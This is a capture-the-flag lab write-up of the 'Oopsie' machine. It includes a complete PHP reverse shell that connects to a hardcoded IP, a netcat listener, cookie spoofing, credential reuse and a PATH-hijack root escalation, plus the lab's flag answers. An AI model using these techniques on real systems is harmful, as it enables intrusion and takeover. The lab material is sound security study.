# Tasks
- With what kind of tool can intercept web traffic?
	- proxy
- What is the path to the directory on the webserver that returns a login page?
	- /cdn-cgi/login
- What can be modified in Firefox to get access to the upload page?
	- cookie
- What is the access ID of the admin user?
	- 34322
- On uploading a file, what directory does that file appear in on the server?
	- /uploads
- What is the file that contains the password that is shared with the robert user?
	- db.php
- What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
	- find
- Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
	- root
- What SUID stands for?
	- Set Owner User ID
- What is the name of the executable being called in an insecure manner?
	- cat
- User flag:
	- f2c74ee8db7983851ab2a96a44eb7981
- Root flag:
	- af13b0bee69f8a877c3faf667f7beacf

# Notes
- First, we are going to run a rustscan to see what is up
```
rustscan --ulimit 5000 --addresses "10.129.95.191" --top -- -sC -sV
```
- We are able to see the existence of an SSH server and web server according to the results:
```
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxctowbmnTyFHK0XREQShvlp32DNZ7TS9fp1pTxwt4urebfFSitu4cF2dgTlCyVI6o+bxVLuWvhbKqUNpl/9BCv/1DFEDmbbygvwwcONVx5BtcpO/4ubylZXmzWkC6neyGaQjmzVJFMeRTTUsNkcMgpkTJXSpcuNZTknnQu/SSUC5ZUNPdzgNkHcobGhHNoaJC2  
StrcFwvcg2ftx6b+wEap6jWbLId8UfJk0OFCHZWZI/SubDzjx3030ZCacC1Sb61/p4Cz9MvLL5qPYcEm8A14uU9pTUfDvhin1KAEEDCSCS3bnvtlw1V7SyF/tqtzPNsmdqG2wKXUb6PLyllU/L  
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaHbfbieD7gNSibdzPXBW7/NO05J48DoR4Riz65jUkMsMhI+m3mHjowOPQISgaB8VmT/kUggapZt/iksoOn2Ig=  
|   256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLh0LONi0YmlZbqc960WnEcjI1XJTP8Li2KiUt5pmkk  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Welcome  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The first task is a concept question, in which we know that proxies allow us to intercept web traffic
- Next, we need the path for the login page.
- We can do this manually, but I'll go ahead and run a quick gobuster against it:
```
gobuster dir -w `fzf-wordlists` -u http://10.129.95.191
```
- From the results, not able to really see much
```
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.129.95.191  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]  
/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]  
/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]  
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]  
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]  
/fonts                (Status: 301) [Size: 314] [--> http://10.129.95.191/fonts/]
```
- Since we are being pushed towards Burp, I'll go ahead and fire that up
- From the HTTP history in Burp Suite, we are able to pull out the path of: /cdn-cgi/login
- Next, we need to identify what we are able to easily manipulate/spoof, which are cookies
- Now with that in mind, we are asked about the access ID of the admin user
- Going to the login page, I noticed that we can login as a guest, and when we go to the Accounts page, we are given an access ID, which is the information we are looking for
- Now, we can modify the URL's page ID to return different access IDs, in which we get the admin's on page 1
- We are then able to grab the access of id of 34322
- Next, we are asked about the directory that files are able to appear on the server
- In this case, this would be the /uploads directory
- Next, we need the file that contains the password that the user robert shared
- To achieve that, we need to use the Uploads directory
- However, for that, we need to modify our cookie to spoof that access id
- This can be done by changing the value directly using the Developer Tools
- Once we do that, we can get access to the upload feature
- With this feature, we should be able to upload something like a simple PHP reverse shell
- So, we'll do that. Here's the reverse shell we are going to use:
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.15.113';
$port = 4444;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
- Now that we uploaded it, we need to find out where it is stored... luckily for us though, we did a Gobuster run earlier, and identified the /uploads folder, so let's use that and attempt to access our shell.php file
- Before running the file, we'll go ahead and fire up netcat to catch the connection and establish it
```
nc -lvnp 4444
```
- By going to /uploads/shell.php, we are able to get our connection up and running!
- From this, we get a basic shell, but let's go ahead and upgrade it using this:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- Now, we need to do lateral movement so that we can get into different users to see what they have.
- Navigating to the login directory, we are able to see the db.php file, which is what we are looking for
- We can pull out a user and password from the file:
```
<?php  
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');  
?>
```
-  So, we can change into robert
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert  
su robert  
Password: M3g4C0rpUs3r!  
  
robert@oopsie:/var/www/html/cdn-cgi/login$ whoami  
whoami  
robert  
robert@oopsie:/var/www/html/cdn-cgi/login$
```
- It's not asked right now, but I'll go ahead and just grab the user flag
	- f2c74ee8db7983851ab2a96a44eb7981
- Now, we need to priv-esc. We can't use sudo -l since it robert is not able to use sudo.
- So, looking into id, we see that they are part of a special "bugtracker" group. This maybe a possible lead:
```
robert@oopsie:/var/www/html/cdn-cgi$ id  
id  
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
- Maybe there are some binaries we can use from there? So, let's do a quick check:
```
find / -group bugtracker 2>/dev/null
```
- We can then find the existence of a binary also named bugtracker:
```
robert@oopsie:/var/www/html/cdn-cgi$ find / -group bugtracker 2>/dev/null  
find / -group bugtracker 2>/dev/null  
/usr/bin/bugtracker
```
 - Okay, let's see what we are dealing with:
```
robert@oopsie:/var/www/html/cdn-cgi$ ls -la /usr/bin/bugtracker  
ls -la /usr/bin/bugtracker  
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker  
robert@oopsie:/var/www/html/cdn-cgi$ file /usr/bin/bugtracker  
file /usr/bin/bugtracker  
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```
- Seems to be a normal binary. We'll run it to see what it does:
```
robert@oopsie:/var/www/html/cdn-cgi$ /usr/bin/bugtracker  
/usr/bin/bugtracker  
  
------------------  
: EV Bug Tracker :  
------------------  
  
Provide Bug ID: 69  
69  
---------------  
  
cat: /root/reports/69: No such file or directory  
  
robert@oopsie:/var/www/html/cdn-cgi$
```
- After running it, it appears to get an ID number in as an input, and then use cat to read out the apparent report via that ID, from the root/reports directory
- Since the whole path is not explicity given, we can exploit this
- What we'll do is create a fake cat that's actually a script to run bash, and then modify the system to use that fake cat rather than the real one, so that when we use bugtracker again, we can execute our code. Okay, let's do that!
- Our fake cat is going to be simple:
```
/bin/bash
```
- So, let's create that file:
```
robert@oopsie:~$ echo "/bin/bash" > cat  
echo "/bin/bash" > cat  
robert@oopsie:~$ ls  
ls  
cat  user.txt  
robert@oopsie:~$ cat cat  
cat cat  
/bin/bash
```
- Next, let's give it run permissions
```
chmod +x cat
```
- Now, let's modify the PATH to point towards our fake cat:
```
robert@oopsie:/tmp$ export PATH=/tmp:$PATH  
export PATH=/tmp:$PATH  
robert@oopsie:/tmp$ echo $PATH  
echo $PATH  
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
- Let's run the program again, and it worked!
```
robert@oopsie:/tmp$ /usr/bin/bugtracker  
/usr/bin/bugtracker  
  
------------------  
: EV Bug Tracker :  
------------------  
  
Provide Bug ID: 1  
1  
---------------  
  
root@oopsie:/tmp# whoamio  
whoamio  
  
Command 'whoamio' not found, did you mean:  
  
 command 'whoami' from deb coreutils  
  
Try: apt install <deb name>  
  
root@oopsie:/tmp# whoami  
whoami  
root  
root@oopsie:/tmp#
```
- From here, we can grab our root flag
```
root@oopsie:/root# more root.txt  
more root.txt  
af13b0bee69f8a877c3faf667f7beacf
```
